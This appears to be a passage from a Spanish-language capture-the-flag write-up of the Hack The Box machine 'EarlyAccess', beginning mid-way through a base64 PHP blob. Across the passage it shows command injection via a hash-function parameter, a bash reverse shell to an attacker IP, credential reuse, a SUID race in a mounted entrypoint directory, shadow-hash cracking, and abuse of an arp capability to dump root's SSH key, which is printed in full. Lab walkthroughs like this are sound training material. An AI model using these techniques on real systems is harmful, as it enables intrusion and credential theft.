iAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydoYXNoJ10gPSAkaGFzaDsKICAgICAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaG9tZS5waHA/dG9vbD1oYXNoaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgLy8gQWN0aW9uIG5vdCBzZXQsIGlnbm9yZQogICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiIik7Cn0KY2F0Y2goRXhjZXB0aW9uICRleCkKewogICAgaWYoJGV4LT5nZXRNZXNzYWdlKCkgIT09ICIiKQogICAgICAgICRfU0VTU0lPTlsnZXJyb3InXSA9IGh0bWxlbnRpdGllcygkZXgtPmdldE1lc3NhZ2UoKSk7CgogICAgaGVhZGVyKCdMb2NhdGlvbjogL2hvbWUucGhwJyk7CiAgICByZXR1cm47Cn0KPz4=<h2>Executed file successfully!
```

Puedo tratar de cargar otra función en ```hash_function```

```null
// Only allow custom hashes, if `debug` is set
if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
    throw new Exception("Only MD5 and SHA1 are currently supported!");

$hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
if(!isset($_REQUEST['redirect']))
{
    echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
    echo '<br>' . $hash;
    return;
}
else
{
    $_SESSION['hash'] = $hash;
    header('Location: /home.php?tool=hashing');
    return;
```

Al añadir el parámetro ```debug``` y cambiar la función por un ```system``` obtengo ejecución remota de comandos

<img src="/writeups/assets/img/EarlyAccess-htb/22.png" alt="">

<img src="/writeups/assets/img/EarlyAccess-htb/23.png" alt="">

Me entablo una reverse shell

```null
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.9/443+0>%261
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.110] 42690
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ script /dev/null -c bash
<rlyaccess.htb/dev/actions$ script /dev/null -c bash     
Script started, file is /dev/null
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export TERM=xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export SHELL=bash
9ww-data@webserver:/var/www/earlyaccess.htb/dev/actions$ stty rows 55 columns 20 
```

Estoy dentro de un contenedor

```null
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ whoami
www-data
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ hostname -I
172.18.0.102 
```

Demtro del directorio personal del usuario ```www-adm``` hay un archivo de configuración de ```wget```. Se reutiliza la contraseña ```gameover```

```null
www-data@webserver:/home/www-adm$ su www-adm
Password: 
www-adm@webserver:~$ 
```

Dentro hay credenciales de otro usuario

```null
www-adm@webserver:~$ cat .wgetrc 
user=api
password=s3CuR3_API_PW!
```

Subo un binario estático de ```nmap``` para hacer hostdiscovery

```null
www-adm@webserver:/tmp$ ./nmap 172.18.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-07 21:17 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Host is up (0.00045s latency).
Not shown: 1204 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap scan report for admin-simulation.app_nw (172.18.0.2)
Host is up (0.0013s latency).
All 1207 scanned ports on admin-simulation.app_nw (172.18.0.2) are closed

Nmap scan report for mysql.app_nw (172.18.0.100)
Host is up (0.0012s latency).
Not shown: 1206 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for api.app_nw (172.18.0.101)
Host is up (0.00041s latency).
All 1207 scanned ports on api.app_nw (172.18.0.101) are closed

Nmap scan report for webserver (172.18.0.102)
Host is up (0.00025s latency).
Not shown: 1205 closed ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 256 IP addresses (5 hosts up) scanned in 15.72 seconds
```

La ```172.18.0.101``` tiene el puerto 5000 abierto

```null
www-adm@webserver:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn 172.18.0.101 -vvv

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-07 21:24 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Initiating Connect Scan at 21:24
Scanning 172.18.0.101 [65535 ports]
Discovered open port 5000/tcp on 172.18.0.101
Completed Connect Scan at 21:24, 2.15s elapsed (65535 total ports)
Nmap scan report for 172.18.0.101
Host is up, received user-set (0.00017s latency).
Scanned at 2023-03-07 21:24:33 UTC for 3s
Not shown: 65534 closed ports
Reason: 65534 conn-refused
PORT     STATE SERVICE REASON
5000/tcp open  unknown syn-ack

Read data files from: /etc
Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
```

Si me autentico puedo ver credenciales en texto claro

```null
www-adm@webserver:/tmp$ curl -s -X GET 'http://api:s3CuR3_API_PW!@172.18.0.101:5000/check_db'
...
      "Env": [
        "MYSQL_DATABASE=db",
        "MYSQL_USER=drew",
        "MYSQL_PASSWORD=drew",
        "MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",
        "SERVICE_TAGS=dev",
        "SERVICE_NAME=mysql",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "GOSU_VERSION=1.12",
        "MYSQL_MAJOR=8.0",
        "MYSQL_VERSION=8.0.25-1debian10"
...
```

Son válidas por SSH

```null
ssh drew@10.10.11.110
The authenticity of host '10.10.11.110 (10.10.11.110)' can't be established.
ED25519 key fingerprint is SHA256:wcU4npxYBRlmf7P8mERZj6uuJEmycvP4NFGsQVZHvhU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.110' (ED25519) to the list of known hosts.
drew@10.10.11.110's password: 
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.6
drew@earlyaccess:~$ cat user.txt 
65b4afefaa08a941b4ca64b1479f1d3b
```

# Escalada

En su directorio ```.ssh``` hay una clave pública de otro usuario

```null
drew@earlyaccess:~/.ssh$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMYU1DjEX8HWBPFBxoN+JXFBJUZBPr+IFO5yI25HMkFSlQZLaJajtEHeoBsD1ldSi7Q0qHYvVhYh7euYhr85vqa3cwGqJqJH54Dr5WkNDbqrB5AfgOWkUIomV4QkfZSmKSmI2UolEjVf1pIYYsJY+glqzJLF4hQ8x4d2/vJj3CmWDJeA0AGH0+3sjpmpYyoY+a2sW0JAPCDvovO1aT7FOnYKj3Qyl7NDGwJkOoqzZ66EmU3J/1F0e5XNg74wK8dvpZOJMzHola1CS8NqRhUJ7RO2EEZ0ITzmuLmY9s2N4ZgQPlwUvhV5Aj9hqckV8p7IstrpdGsSbZEv4CR2brsEhwsspAJHH+350e3dCYMR4qDyitsLefk2ezaBRAxrXmZaeNeBCZrZmqQ2+Knak6JBhLge9meo2L2mE5IoPcjgH6JBbYOMD/D3pC+MAfxtNX2HhB6MR4Rdo7UoFUTbp6KIpVqtzEB+dV7WeqMwUrrZjs72qoGvO82OvGqJON5F/OhoHDao+zMJWxNhE4Zp4DBii39qhm2wC6xPvCZT0ZSmdCe3pB82Jbq8yccQD0XGtLgUFv1coaQkl/CU5oBymR99AXB/QnqP8aML7ufjPbzzIEGRfJVE2A3k4CQs4Zo+GAEq7WNy1vOJ5rZBucCUXuc2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server
```

No existe en esta máquina, pero puede que en un contenedor que esté desplegado

```null
drew@earlyaccess:~/.ssh$ hostname -I
10.10.11.110 172.17.0.1 172.18.0.1 172.19.0.1 
```

Subo un binario estático de ```nmap``` para encontrar una IP con el puerto 22 abierto

```null
drew@earlyaccess:/tmp$ ./nmap --min-rate 5000 -n -Pn --open -p22 172.17.0.1/24 172.18.0.1/24 172.19.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-08 09:01 CET
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.0012s latency).
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 172.18.0.1
Host is up (0.00038s latency).
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 172.19.0.1
Host is up (0.0011s latency).
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 172.19.0.2
Host is up (0.00012s latency).
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 768 IP addresses (768 hosts up) scanned in 0.46 seconds
```

Pruebo a conectarme sin proporcinar contraseña

```null
drew@earlyaccess:/tmp$ ssh game-tester@172.19.0.2
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
game-tester@game-server:~$ 
```

El ```linpeas``` encuentra una ruta de correos en la máquina víctima

```null
╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
MAIL=/var/mail/drew
LANGUAGE=en_US:en
USER=drew
SSH_CLIENT=10.10.16.9 40720 22
XDG_SESSION_TYPE=tty
SHLVL=1
HOME=/home/drew
OLDPWD=/home/drew
```

```null
drew@earlyaccess:/tmp$ cat /var/mail/drew
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021


Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).
```

```arp``` tiene una capability asignada

```null
Files with capabilities (limited to 50):
/usr/sbin/arp =ep
/usr/bin/ping = cap_net_raw+ep
```

Puedo leer archivos privilegiados

<img src="/writeups/assets/img/EarlyAccess-htb/24.png" alt="">

```null
drew@earlyaccess:/tmp$ /usr/sbin/arp -v -f "/etc/shadow"
-bash: /usr/sbin/arp: Permission denied
```

Pero únicamente el grupo ```adm``` lo puede ejecutar

```null
drew@earlyaccess:/tmp$ ls -l /usr/sbin/arp
-rwxr-x--- 1 root adm 67512 Sep 24  2018 /usr/sbin/arp
```

El contenedor tiene el puerto 9999 abierto

```null
game-tester@game-server:/$ ss -nltp
State       Recv-Q Send-Q                                                           Local Address:Port                                                                          Peer Address:Port              
LISTEN      0      128                                                                          *:9999                                                                                     *:*                  
LISTEN      0      128                                                                          *:22                                                                                       *:*                  
LISTEN      0      128                                                                 127.0.0.11:38715                                                                                    *:*                  
LISTEN      0      128                                                                         :::22                                                                                      :::*    
```

Corresponde a una web

```null
game-tester@game-server:/tmp$ curl localhost:9999
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Rock v0.0.1</title>
    </head>
    <body>
        <div class="container">
            <div class="panel panel-default">
                <div class="panel-heading"><h1>Game version v0.0.1</h1></div>
                    <div class="panel-body">
                        <div class="card header">
                            <div class="card-header">
                                Test-environment for Game-dev
                            </div>
                            <div>
                                <h2>Choose option</h2>
                                <div>
                                    <a href="/autoplay"><img src="x" alt="autoplay"</a>
                                    <a href="/rock"><img src="x" alt="rock"></a> 
                                    <a href="/paper"><img src="x" alt="paper"></a>
                                    <a href="/scissors"><img src="x" alt="scissors"></a>
                                </div>
                                <h3>Result of last game:</h3>
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
```

Me vuelvo a conectar por SSH para crear un Dinamic Port Forwarding y montarme un tunel por SOCKS5 para tener acceso a este servicio

```null
ssh drew@10.10.11.110 -D 1080
```

Creo un nuevo proxy en ```FoxyProxy```

<img src="/writeups/assets/img/EarlyAccess-htb/25.png" alt="">

<img src="/writeups/assets/img/EarlyAccess-htb/26.png" alt="">

Al arrancar el contenedor, itera por cada valor en un directorio

```null
game-tester@game-server:/$ cat entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null
```

Unícamente existe un script en bash

```null
game-tester@game-server:/docker-entrypoint.d$ cat node-server.sh 
service ssh start

cd /usr/src/app

# Install dependencies
npm install

sudo -u node node server.js
```

No tengo capacidad de crear archivos

```null
game-tester@game-server:/docker-entrypoint.d$ touch test
touch: cannot touch 'test': Permission denied
```

En ```/usr/src/app``` está desplegado el ```Game version````. Si hay un error, se detiene el programa

```null
app.post('/autoplay', async function autoplay(req,res) {
  
  // Stop execution if not number
  if (isNaN(req.body.rounds))
  {
    res.sendStatus(500);
    return;
  }
  // Stop execution if too many rounds are specified (performance issues may occur otherwise)
  if (req.body.rounds > 100)
  {
    res.sendStatus(500);
    return;
  }
```

Fuerzo con ```BurpSuite``` a enviar un valor negativo. Es necesario configurar el proxy por SOCKS5 para que se pueda comunicar

<img src="/writeups/assets/img/EarlyAccess-htb/27.png" alt="">

Lo más probable es que todos estos archivos se estén arrastrando con monturas al contenedor, así que desde la máquina víctima, busco de forma recursiva por el script ```node-server.sh```

```null
drew@earlyaccess:/$ find \-name node-server.sh 2>/dev/null 
./opt/docker-entrypoint.d/node-server.sh
```

Ahora sí tengo permisos de escritura

```null
drew@earlyaccess:/$ cd /opt/docker-entrypoint.d/
drew@earlyaccess:/opt/docker-entrypoint.d$ ls
node-server.sh
drew@earlyaccess:/opt/docker-entrypoint.d$ touch test
drew@earlyaccess:/opt/docker-entrypoint.d$ echo $?
0
`` 

Desde la máquina host, creo un bucle que se encargue de crear un script que se encargue de asignarle el SUID a la bash del contenedor

```null
drew@earlyaccess:/opt/docker-entrypoint.d$ while true; do echo 'chmod u+s /bin/bash' > pwned.sh; chmod +x pwned.sh; sleep 1; done
```

Al corromper el servicio y volver a entrar al contenedor, lo hago como ```root```

```null
-bash-4.4$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
-bash-4.4$ bash -p
bash-4.4# whoami
root
```

Crackeo el hash de ```game-adm``` del ```/etc/shadow```

```null
game-adm:$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7:::
```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA384"
Use the "--format=HMAC-SHA384" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
gamemaster       (game-adm) 
```

Se reutiliza la contraseña pra la máquina host

```null
drew@earlyaccess:~$ su game-adm
Password: 
game-adm@earlyaccess:/home/drew$ 
```

Ahora ya puedo abusar de la capability de ```arp```

Puedo leer la ```id_rsa``` de ```root```

```null
game-adm@earlyaccess:/home/drew$ /usr/sbin/arp -v -f "/root/.ssh/id_rsa"
>> -----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN: Unknown host
arp: cannot set entry on line 1 of etherfile /root/.ssh/id_rsa !
>> b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
arp: format error on line 2 of etherfile /root/.ssh/id_rsa !
>> NhAAAAAwEAAQAAAQEArIOXIvZx/5LspJVtY/Y5eT3B0g+hf1t4NEwLljBNrVzW3Y1JFDTL
arp: format error on line 3 of etherfile /root/.ssh/id_rsa !
>> bsqeX+jY1B0lLH361DrhTMra1KSHtTtk+Y6FLqUaYOnlxPlEnaldg/F9c+ch6bzgvEoYai
arp: format error on line 4 of etherfile /root/.ssh/id_rsa !
>> Z/GLfnkdrY9mmU3wrCi4c7OIe1YOwPPtNLYJb76qg7dVrj9beJjT+ZRG7JflgS/aQtFUVe
arp: format error on line 5 of etherfile /root/.ssh/id_rsa !
>> 9NkES/xNk80E4q1Ypbodj8pJcyWek9LXC5/+sdhV4KnUHZjoNZ+BlcpKsYvC0K1we02oC7
arp: format error on line 6 of etherfile /root/.ssh/id_rsa !
>> 3p05jrBZXYwCgzPTy/8DZ9FZr6oSBleQR8lPl6xPo6D32gcHRvVJCSakvVcjJWH2L227+3
arp: format error on line 7 of etherfile /root/.ssh/id_rsa !
>> 6g4RguqXGwAAA8ihamwioWpsIgAAAAdzc2gtcnNhAAABAQCsg5ci9nH/kuyklW1j9jl5Pc
arp: format error on line 8 of etherfile /root/.ssh/id_rsa !
>> HSD6F/W3g0TAuWME2tXNbdjUkUNMtuyp5f6NjUHSUsffrUOuFMytrUpIe1O2T5joUupRpg
arp: format error on line 9 of etherfile /root/.ssh/id_rsa !
>> 6eXE+USdqV2D8X1z5yHpvOC8ShhqJn8Yt+eR2tj2aZTfCsKLhzs4h7Vg7A8+00tglvvqqD
arp: format error on line 10 of etherfile /root/.ssh/id_rsa !
>> t1WuP1t4mNP5lEbsl+WBL9pC0VRV702QRL/E2TzQTirViluh2PyklzJZ6T0tcLn/6x2FXg
arp: format error on line 11 of etherfile /root/.ssh/id_rsa !
>> qdQdmOg1n4GVykqxi8LQrXB7TagLvenTmOsFldjAKDM9PL/wNn0VmvqhIGV5BHyU+XrE+j
arp: format error on line 12 of etherfile /root/.ssh/id_rsa !
>> oPfaBwdG9UkJJqS9VyMlYfYvbbv7fqDhGC6pcbAAAAAwEAAQAAAQACv4Xk1LA0Ng73ADph
arp: format error on line 13 of etherfile /root/.ssh/id_rsa !
>> 4UZBHC6+PemAseBUVPHKTrKuFFCH7vw/CihDd47WUEtD9cLl1ovsXZPBOWoLASP4Sx3sq8
arp: format error on line 14 of etherfile /root/.ssh/id_rsa !
>> yLVa355T/3x1DEgjIvK+WntwLfSlb6KOQCrOJRbnyN4kKaikwI0Y8P0fOrjt3g0WHcyljl
arp: format error on line 15 of etherfile /root/.ssh/id_rsa !
>> DQKuVke8Mtp2y5L+qKOyh48O+nHvc9prBnyqq0wlgnNr/Fm/S4go2O8M2CWp9AeK7YdtlO
arp: format error on line 16 of etherfile /root/.ssh/id_rsa !
>> Y7Ertr9iCY3O+3U9W/4LLxu9JVacdhqGqnig6FMQfY9TmnRLdiDvYbzESPwNRtGtTDJoFf
arp: format error on line 17 of etherfile /root/.ssh/id_rsa !
>> TgUJqvD+21ZT/k5gr2L4r8D/aB4z/ZES4x8F7IjG6+3hAAAAgBzC+fdpajuVkO3jTsleKx
arp: format error on line 18 of etherfile /root/.ssh/id_rsa !
>> npsnDqSPHlufw/U9nQutXTzv9CQClkOcCcJSONo3epcktDbx5LrUxtH72OmuZoLJCHPxtQ
arp: format error on line 19 of etherfile /root/.ssh/id_rsa !
>> +nKJdRSuTfF9vMmMMr44ovq9chO6BfSHnlS6OAoMQZENxClUWjr95AOd7iZJ20MxdNyiZZ
arp: format error on line 20 of etherfile /root/.ssh/id_rsa !
>> /ITMd6O6C/AAAAgQDYH/3pNv83rrECgtMai6pp2yS1bhLReI8SmnpJRSapk4+Ueh4Ww89N
arp: format error on line 21 of etherfile /root/.ssh/id_rsa !
>> I3RMM6hSAKkB0/X99LZNUvnkkvUE9cZK15sA0RTUSm/hzfKx9TthtZMx4fIksnDlvk9Fix
arp: format error on line 22 of etherfile /root/.ssh/id_rsa !
>> wo+Fdbj05u4++fWlQufx9lhfGdKLkSzvo4ycAp+0/aaOm6rwAAAIEAzFfEivv2iVee/lv4
arp: format error on line 23 of etherfile /root/.ssh/id_rsa !
>> 1AnfsSOFhJ2FNd58S6ApYqfoz7+dKDJ74k5HnrkCjD8tcRGld1Ebaq3lBEUn+5eI/km16P
arp: format error on line 24 of etherfile /root/.ssh/id_rsa !
>> ceeCjUt48nzOX23RvBAt9dAhl0UYQr/9Bc7Wuijv/Y9xJdp2s6V5CTaUuxA6283zxy+6+b
arp: format error on line 25 of etherfile /root/.ssh/id_rsa !
>> fD4WoE/0eunE1VUAAAAQcm9vdEBlYXJseWFjY2VzcwECAw==
arp: format error on line 26 of etherfile /root/.ssh/id_rsa !
>> -----END OPENSSH PRIVATE KEY-----
-----END: Unknown host
arp: cannot set entry on line 27 of etherfile /root/.ssh/id_rsa !
```

La adecuo al formato

```null
cat id_rsa | grep -v "arp" | sed 's/>> //' | sponge id_rsa
chmod 600 !$
```

Puedo ver la segunda flag

```null
ssh root@10.10.11.110 -i id_rsa
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  5 15:58:25 2021 from 10.10.14.6
root@earlyaccess:~# cat /root/root.txt
708d2ccb23de54183f762907fffbb6fb
```